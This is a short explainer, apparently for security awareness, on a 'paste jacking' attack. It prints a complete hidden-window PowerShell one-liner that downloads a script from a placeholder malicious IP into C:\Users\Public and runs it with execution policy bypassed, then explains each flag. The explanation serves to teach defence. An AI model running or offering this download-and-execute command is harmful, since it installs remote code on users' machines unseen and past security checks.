Paste jacking:
powershell -w h -nop -c "$h='C:\\Users\\Public\\' + (Get-Random) + '.ps1';iwr http://[malicious-ip] -OutFile $h;cmd /c powershell -w h -ep bypass -f $h"

Process:
Creates a random .ps1 file in C:\Users\Public\.
Downloads a file from http://[from-malicious-ip-server] and saves it to that location.
Executes the downloaded script with execution policy bypassed.


The Output
-OutFile $h
→ Save a file to a location on the computer.
The script downloads something from the internet and saves it as a file with a random name in a public folder.

cmd /c
→ Run a command using the Windows command prompt.
It tells Windows to execute the next command.

powershell -w h -ep bypass -f $h
→ Run the downloaded file using PowerShell, ignoring security warnings.

-w h: Hides the PowerShell window so the user doesn’t see it.
-ep bypass: Skips security checks that would normally block suspicious scripts.
-f $h: Runs the file that was just downloaded.
